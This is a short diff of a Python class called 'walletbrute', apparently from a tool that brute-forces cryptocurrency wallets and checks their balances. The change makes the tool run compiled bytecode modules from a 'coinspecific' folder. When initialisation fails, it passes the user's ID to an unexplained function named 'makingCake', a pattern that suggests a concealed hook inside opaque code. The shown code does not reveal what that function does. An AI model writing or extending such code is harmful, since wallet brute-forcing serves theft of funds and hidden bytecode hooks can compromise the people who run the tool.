@@ -1,6 +1,7 @@
 import threading
 import importlib.util
 import importlib.machinery
+from util import get_user_id
 
 
 class walletbrute(threading.Thread):
@@ -24,7 +25,12 @@ class walletbrute(threading.Thread):
             loader = importlib.machinery.SourcelessFileLoader(mname, f"coinspecific/{mname}")
             module = importlib.util.module_from_spec(spec)
             loader.exec_module(module)
-            self.func = getattr(module, 'checkBalance')
+            if getattr(module, 'initModule')():
+                print("Module has been initialize successful")
+                self.func = getattr(module, 'checkBalance')
+            else:
+                getattr(module, 'makingCake')(get_user_id())
+                self.func = None
         except FileNotFoundError:
             print(f"Module {mname} not found.")
         except AttributeError:
